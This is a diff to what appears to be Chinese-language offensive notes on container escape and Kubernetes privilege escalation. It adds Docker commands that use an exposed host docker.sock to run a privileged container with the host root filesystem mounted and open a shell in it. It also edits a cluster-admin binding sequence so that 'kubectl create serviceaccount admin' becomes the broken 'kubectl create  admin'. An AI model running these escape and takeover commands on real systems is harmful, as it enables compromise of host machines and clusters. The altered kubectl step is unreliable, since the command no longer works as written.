@@ -437,6 +437,14 @@ curl -s --unix-socket /private/var/run/docker.sock -X POST "http://127.0.0.1/exe
 
 之后仍然可以按照之前的思路来容器逃逸。
 
+```bash
+# create a privileged container with host root filesystem mounted - wtm@offensi.com
+sudo docker -H unix:///google/host/var/run/docker.sock pull alpine:latest
+sudo docker -H unix:///google/host/var/run/docker.sock run -d -it --name LiveOverflow-container -v "/proc:/host/proc" -v "/sys:/host/sys" -v "/:/rootfs" --network=host --privileged=true --cap-add=ALL alpine:latest
+sudo docker -H unix:///google/host/var/run/docker.sock start LiveOverflow-container
+sudo docker -H unix:///google/host/var/run/docker.sock exec -it LiveOverflow-container /bin/sh
+```
+
 
 
 
@@ -704,7 +712,7 @@ kubectl --insecure-skip-tls-verify -s https://master_ip:6443/ --token="xxxxxx" g
 创建一个sa账号并绑定cluster-admin：
 
 ```bash
-kubectl create serviceaccount admin
+kubectl create  admin
 kubectl create clusterrolebinding cluster-admin-admin  --clusterrole=cluster-admin --serviceaccount=default:admin
 ```
 
